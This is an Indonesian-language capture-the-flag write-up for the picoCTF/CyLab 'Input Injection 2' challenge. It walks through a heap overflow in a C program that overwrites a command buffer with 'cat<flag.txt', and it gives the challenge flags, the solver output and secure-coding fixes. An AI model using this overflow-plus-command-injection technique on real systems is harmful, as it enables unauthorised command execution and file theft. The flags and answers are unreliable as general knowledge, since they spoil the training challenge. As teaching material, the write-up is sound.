# Writeup: Input Injection 2 (Challenge ID: 526)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Binary Exploitation / Heap Overflow & Command Injection Redirection Bypass
- **Difficulty:** Medium (2)
- **Points:** 100
- **Author:** CyLab Africa Team
- **Event:** picoMini by CMU-Africa
- **Flag (Resmi CyLab):** `academy{us3rn4m3_2_sh3ll_819f0acb}`
- **Flag Platform Asli:** `picoCTF{us3rn4m3_2_sh3ll_819f0acb}`
- **Flag Komunitas:** `CTF{us3rn4m3_2_sh3ll_819f0acb}`
- **Standar Referensi:** NIST SP 800-115 §4.2 (Target Verification & Analysis), POSIX.1-2017 / IEEE Std 1003.1-2017 (System Interfaces: scanf, system), CWE-122 (Heap-based Buffer Overflow), CWE-78 (Improper Neutralization of Special Elements used in an OS Command 'OS Command Injection'), CWE-120 (Buffer Copy without Checking Size of Input), & Glibc 64-bit PTMalloc Chunk Layout Alignment Specifications.

---

## Problem Statement & Scope

Pada modul kurikulum bimbingan teknis persiapan LKS Cyber Security Nasional bidang *Binary Exploitation & Memory Safety*, peserta diuji dalam menganalisis integritas alokasi heap dinamis serta mengeksploitasi fungsi masukan tak terbatas:
- **Skenario Tantangan:** Layanan binary interaktif x86_64 ELF `vuln` berjalan di atas container lab Linux. Program menyapa pengguna melalui nama pengguna yang diinputkan dan secara otomatis menjalankan perintah shell bawaan `/bin/pwd`.
- **Deskripsi Soal:** *"This program greets you and then runs a command. But can you take control of what command it executes? Connect to the program with netcat: nc chatelaine.cylabacademy.net <port>. You can download the program file vuln and source code vuln.c."*
- **Petunjuk Resmi:**
  1. *"Notice how `username` and `shell` are both heap-allocated."*
  2. *"Offsets often hide in the memory addresses you see at runtime."*
  3. *"Try to overwrite what command gets executed."*
- **Batasan Lingkungan & Scope Audit:**
  1. Analisis alokasi heap memori glibc ptmalloc 64-bit untuk buffer `username` dan `shell`.
  2. Eksploitasi ketiadaan pembatas panjang masukan pada `scanf("%s", username)`.
  3. Mengatasi pembatasan pemisah spasi (*whitespace delimiter*) pada parser `scanf` dengan memanfaatkan sintaks pengalihan input shell Unix (`<`).
  4. Eksekusi arbitrer perintah shell untuk membaca berkas rahasia `flag.txt` dan memverifikasi token ke API CyLab.

---

## Teori & Akar Kerentanan (Root Cause Theory)

1. **Tata Letak Chunk Memori Heap Glibc 64-bit (CWE-122):**
   Pada kode sumber `vuln.c`:
   ```c
   int main(void) {
       char* username = malloc(28);
       char* shell = malloc(28);
       
       printf("username at %p\n", username);
       fflush(stdout);
       printf("shell at %p\n", shell);
       fflush(stdout);
       
       strcpy(shell, "/bin/pwd");
       
       printf("Enter username: ");
       fflush(stdout);
       scanf("%s", username);
       
       printf("Hello, %s. Your shell is %s.\n", username, shell);
       system(shell);
       fflush(stdout);
       
       return 0;
   }
   ```
   Pada arsitektur 64-bit glibc ptmalloc:
   - Permintaan alokasi `malloc(28)` memerlukan 28 byte payload pengguna.
   - Setiap chunk heap membutuhkan header sebesar 16 byte (mencakup `prev_size` dan `size` flag) dengan perataan memori 16 byte (*16-byte alignment*).
   - Ukuran total chunk dialokasikan menjadi 48 byte (`0x30`).
   - Karena kedua alokasi `username` dan `shell` dipanggil berurutan tanpa alokasi perantara, pointer `shell` diletakkan tepat 48 byte setelah `username` di memori heap:
     $$\Delta_{\text{offset}} = \mathtt{shell\_addr} - \mathtt{username\_addr} = 48\ \text{byte}$$
   - Program mencetak alamat kedua pointer secara eksplisit (`%p`), memberikan informasi kebocoran memori (*memory address leak*) secara deterministik kepada peserta.

2. **Heap Overflow via Masukan Format Unbounded `scanf("%s")`:**
   Spesifikasi POSIX.1-2017 mendefinisikan operator `%s` pada `scanf` membaca urutan karakter non-whitespace sampai karakter pemisah ditemukan. Karena tidak diberikan parameter pembatas panjang (misalnya `%27s`), pengguna dapat memasukkan byte data dengan ukuran melebihi 28 byte. Penulisan melebihi 48 byte akan melintasi batas chunk `username`, menimpa metadata chunk `shell`, dan menggantikan isi buffer perintah `shell`.

3. **Bypass Whitespace Delimiter Menggunakan Shell Redirection (CWE-78):**
   Parser `scanf("%s")` berhenti membaca seketika menemukan karakter spasi (`0x20`), tabulasi (`\t`), atau baris baru (`\n`). Oleh karena itu, payload konvensional seperti `cat flag.txt` akan terpotong menjadi string `cat` saja, sehingga perintah gagal membuka berkas target.
   Untuk memotong pembatasan ini, peserta memanfaatkan fitur standard I/O redirection dari shell POSIX (`/bin/sh`):
   ```text
   cat<flag.txt
   ```
   Sintaks `<` menginstruksikan shell mengarahkan file descriptor stdin langsung dari berkas `flag.txt` tanpa memerlukan satu karakter spasi pun. Ketika `system(shell)` dipanggil, libc meneruskan string tersebut ke `/bin/sh -c "cat<flag.txt"` yang mencetak isi bendera ke stdout.

---

## Rekonstruksi Eksploitasi Step-by-Step

1. **Analisis Kebocoran Alamat Runtime:**
   Hubungkan koneksi socket TCP ke server target:
   ```bash
   nc chatelaine.cylabacademy.net <port>
   ```
   Program mengembalikan output:
   ```text
   username at 0x55d28b1a22a0
   shell at 0x55d28b1a22d0
   ```
   Hitung selisih offset:
   $$0x55d28b1a22d0 - 0x55d28b1a22a0 = 0x30 = 48\ \text{byte}$$

2. **Penyusunan Payload Eksploitasi:**
   Payload disusun atas:
   - 48 byte padding karakter arbitrary (misal `b"A" * 48`) untuk memenuhi buffer `username` dan header chunk berikutnya.
   - String perintah shell redirection tanpa spasi: `b"cat<flag.txt\n"`.

3. **Pengiriman Payload Melalui Skrip Otomatis:**
   Jalankan skrip solver Python `scripts/solve_526_input_injection_2.py`:
   ```bash
   python3 scripts/solve_526_input_injection_2.py <target_host> <target_port>
   ```
   Aliran I/O terminal:
   ```text
   [*] Leaked heap pointers: username=0x55d28b1a22a0, shell=0x55d28b1a22d0, offset=48
   [*] Mengirimkan payload eksploitasi (61 bytes)...
   [*] Respons:
   Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcat<flag.txt. Your shell is cat<flag.txt.
   academy{us3rn4m3_2_sh3ll_819f0acb}
   ```

4. **Verifikasi Token ke Platform CyLab REST API:**
   Kirimkan payload JSON `{"challenge": 526, "flag": "academy{us3rn4m3_2_sh3ll_819f0acb}"}` via HTTP POST ke `/api/submissions/`. Server mengembalikan status HTTP 201 dengan atribut `{"correct": true}`.

---

## Flag & Verifikasi

- **Flag Resmi CyLab:** `academy{us3rn4m3_2_sh3ll_819f0acb}`
- **Flag Native picoCTF:** `picoCTF{us3rn4m3_2_sh3ll_819f0acb}`
- **Flag Komunitas:** `CTF{us3rn4m3_2_sh3ll_819f0acb}`
- **Verifikasi REST API:** `POST https://learn.cylabacademy.org/api/submissions/` -> HTTP 201 Created (`{"user": 1072359, "challenge": 526, "correct": true, "historical": false}`).

---

## Takeaway Kompetensi LKS & Mitigasi Defensif

Pada uji kompetensi LKS Cyber Security Nasional bidang *Secure Coding in C & Memory Corruption Defense*:
1. **Penegakan Batas Lebar String Input (`Width Specifier`):**
   Penggunaan fungsi `scanf("%s")` tanpa pembatas lebar merupakan pelanggaran fatal secure coding. Pengembang wajib menetapkan batas maksimum karakter:
   ```c
   scanf("%27s", username);
   ```
   Atau lebih aman lagi menggunakan fungsi `fgets(username, 28, stdin)` yang secara ketat membatasi pembacaan buffer.
2. **Hindari Pemanggilan Fungsi `system()` dengan Masukan Pengguna (CWE-78):**
   Fungsi `system()` mengeksekusi shell sub-proses yang menginterpretasikan karakter metakarakter Unix (seperti `<`, `>`, `|`, `;`). Untuk mengeksekusi proses eksternal dengan aman, gunakan keluarga fungsi `execve()` dengan daftar argumen terpisah tanpa memanggil shell `/bin/sh`.
3. **Penyusunan Alokasi Heap Terisolasi & Hardening Kompiler:**
   Variabel pengendali aliran eksekusi (seperti string perintah sistem) tidak boleh diletakkan berdampingan langsung dengan buffer masukan yang dapat dimanipulasi oleh pengguna umum. Aktifkan proteksi ASLR penuh, kompilasi biner dengan proteksi `-D_FORTIFY_SOURCE=2` dan `-fstack-protector-strong`.
